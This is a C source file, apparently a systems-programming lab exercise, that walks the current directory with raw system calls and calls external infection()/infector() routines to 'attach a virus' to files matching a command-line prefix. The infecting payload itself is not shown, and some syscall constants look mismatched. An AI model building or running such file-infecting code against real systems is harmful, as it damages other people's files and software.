#include "util.h"
#include <dirent.h>
#include <asm-generic/fcntl.h>




#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_GETDENTS 141
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291
#define SYS_EXIT 231
#define STATUS_EXIT 0x55
#define VIRUS_MESSAGE "VIRUS ATTACHED\n"
#define VIRUS_MESSAGE_LEN 14
struct dirent_info
{
    long inode;
    long offset;
    unsigned short length;
    char name[];
 };

extern int system_call();
extern void infection();
extern void infector(char *str);

int main (int argc , char* argv[], char* envp[])
{
    char buffer[8192];
    int fd, bytes_read;
    char *prefix ;
    struct dirent_info *entry ;
    for (int i = 1; i < argc; i++) {
        if (strncmp(argv[i], "-a", 2) == 0) {
            prefix = argv[i] + 2;
        }
    }

    fd = system_call(SYS_OPEN, ".", O_RDONLY|O_DIRECTORY,0);
    if (fd < 0) {
        system_call(SYS_EXIT, STATUS_EXIT);
    }

    bytes_read = system_call(SYS_GETDENTS, fd, buffer, sizeof(buffer));
    if (bytes_read < 0) {
        system_call(SYS_CLOSE, fd);
        system_call(SYS_EXIT, STATUS_EXIT);
    }

    int offset = 0;
    
    
    while (offset < bytes_read) {
        entry = (struct dirent_info *)(buffer + offset );
        char *filename = entry->name;
        system_call(SYS_WRITE, STDOUT, filename, strlen(filename) );
        if ( strncmp(filename, prefix, strlen(prefix)) == 0) {
            infection();
            infector(filename);  // Attach virus to the file
        }

        system_call(SYS_WRITE, STDOUT, "\n", 1);
        
        offset += entry->length  ;
    }
    

    system_call(SYS_CLOSE, fd);
  return 0;
}

